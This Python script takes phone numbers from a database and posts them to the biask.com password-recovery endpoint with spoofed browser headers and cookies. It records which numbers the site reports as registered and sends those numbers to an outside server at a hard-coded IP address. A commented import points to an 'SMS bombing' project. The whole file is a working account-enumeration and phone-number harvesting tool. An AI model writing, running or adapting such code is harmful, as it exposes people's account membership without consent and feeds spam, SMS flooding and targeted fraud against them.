# coding:utf-8
import requests
import time
# from 短信轰炸.number_mongo import number_six
from number_mongo import number_BaFangZiYuan


def check_number(number):
    headers = {'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-encoding': 'gzip, deflate, br',
               'accept-language': 'zh-CN,zh;q=0.9', 'cache-control': 'no-cache', 'content-length': '18',
               'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'cookie': 'qjv__Session=0o5gu5goqfmtavvr940oo1jpls; zg_did=%7B%22did%22%3A%20%2216439ae5fea79-04892e73d20859-3c3c5905-100200-16439ae5feb29%22%7D; gr_user_id=6e642af3-6333-4dbc-88b4-c7a4b38c01c0; Hm_lvt_18fb33d80843bc9c301032b3478ff66a=' + str(
                   int(
                       time.time())) + '; 9d51dc32796ff142_gr_session_id=187a1794-ed88-4ae6-acb4-2764a9133f82_true; __lfcc=1; Hm_lpvt_18fb33d80843bc9c301032b3478ff66a=1529978074; zg_623fc551f596440694cbc3affe11ff43=%7B%22sid%22%3A%201529976086521%2C%22updated%22%3A%201529978073788%2C%22info%22%3A%201529976086529%2C%22superProperty%22%3A%20%22%7B%7D%22%2C%22platform%22%3A%20%22%7B%7D%22%2C%22utm%22%3A%20%22%7B%7D%22%2C%22referrerDomain%22%3A%20%22%22%2C%22landHref%22%3A%20%22https%3A%2F%2Fwww.biask.com%2F%22%7D',
               'origin': 'https://www.biask.com', 'pragma': 'no-cache',
               'referer': 'https://www.biask.com/account/find_password/',
               'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'x-requested-with': 'XMLHttpRequest'}
    url = "https://www.biask.com/account/ajax/check_mobile/"
    form_data = [('mobile', number), ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page


def save_success_number(number):
    with open("success_币问.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币问.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":

    count = 0
    while True:
        try:
            with open("flag_币问.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                if str(result).find("-1") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币问.txt", "w")as f:
                f.write(str(count))
        except:
            pass

# {"rsm":null,"errno":1,"err":null}手机号不存在
# {"rsm":null,"errno":-1,"err":"\u624b\u673a\u53f7\u5df2\u88ab\u6ce8\u518c"}
# {"rsm":null,"errno":-1,"err":"手机号已被注册"}
